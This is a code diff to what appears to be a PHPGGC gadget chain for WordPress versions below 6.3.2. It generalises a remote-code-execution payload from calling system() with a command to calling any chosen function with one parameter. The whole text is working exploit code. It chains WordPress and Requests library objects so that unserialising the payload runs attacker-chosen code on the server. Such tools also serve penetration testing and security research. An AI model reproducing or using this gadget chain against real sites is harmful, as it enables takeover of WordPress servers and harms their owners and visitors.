@@ -7,11 +7,12 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\Command
     public static $version = '< 6.3.2';
     public static $vector = '__toString';
     public static $author = 'pandhacker';
-    public static $information = 'Executes given command through system()';
+    public static $information = 'Executes a given function with an unique parameter';
 
     public function generate(array $parameters)
     {
-        $command = $parameters['command'];
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
 
         $blocks = array(
             'Name' => array(
@@ -22,7 +23,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\Command
         $hooks_recurse_once = new \WpOrg\Requests\Hooks(
             array(
                 'http://localhost/Name' => array(
-                    array('system')
+                    array($function)
                 )
             )
         );
@@ -40,7 +41,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\Command
             )
         );
 
-        $parent = new \WpOrg\Requests\Session('http://localhost/', array($command), array('hooks' => $hooks));
+        $parent = new \WpOrg\Requests\Session('http://localhost/', array($parameter), array('hooks' => $hooks));
         $registered_block_types = new \WP_Theme(null, $parent);
         $registry = new \WP_Block_Type_Registry($registered_block_types);
         $headers = new \WP_Block_List($blocks, $registry);
